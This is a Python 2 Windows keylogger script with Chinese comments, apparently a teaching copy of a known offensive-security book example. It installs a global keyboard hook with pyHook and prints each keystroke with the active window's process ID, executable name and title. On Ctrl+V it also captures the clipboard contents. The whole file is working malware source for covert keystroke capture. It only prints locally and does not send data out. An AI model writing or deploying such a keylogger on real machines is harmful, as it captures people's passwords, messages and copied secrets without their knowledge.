#!/usr/bin/env python
#-*- coding:utf-8 -*-
#键盘记录模块

import pythoncom
import pyHook
import win32clipboard
from ctypes import *

user32=windll.user32
kernel32=windll.kernel32
psapi=windll.psapi
current_window=None

def get_current_process():
    #获取当前窗口的句柄
    #句柄：使用唯一整数标识实例，如窗口、按钮、图标、滚动条
    hwnd=user32.GetForegroundWindow()
    #c语言类型
    pid=c_ulong(0)
    #byref得到变量的地址
    user32.GetWindowThreadProcessId(hwnd,byref(pid))

    process_id="%d"%pid.value

    executable=create_string_buffer("\x00"*512)

    #根据进程id打开进程
    h_process=kernel32.OpenProcess(0x400 | 0x10,False,pid)

    #依据打开的进程，获取进程的可执行文件
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
    window_title=create_string_buffer("\x00"*512)

    #获得窗口显示的文本
    length=user32.GetWindowTextA(hwnd,byref(window_title),512)
    print
    print "[ PID: %s - %s - %s ]"%(process_id,executable.value,window_title.value)
    print

    #关闭句柄
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def KeyStroke(event):
    global current_window
    #如果切换窗口
    if event.WindowName != current_window:
        current_window=event.WindowName
        get_current_process()

    #如果是标准键盘输入
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii)

    #如果是组合键
    else:
        #如果是粘帖操作
        if event.Key == "v":
            #获取剪切板内容
            win32clipboard.OpenClipboard()
            pasted_value=win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print "[PASTE] - %s "%pasted_value
        else:
            print "[%s]"%event.Key
    return True
#创建、注册钩子函数管理器
k1=pyHook.HookManager()
k1.KeyDown=KeyStroke

#注册键盘记录的钩子，永久执行
k1.HookKeyboard()
#阻塞消息处理，从消息队列中取出消息
pythoncom.PumpMessages()
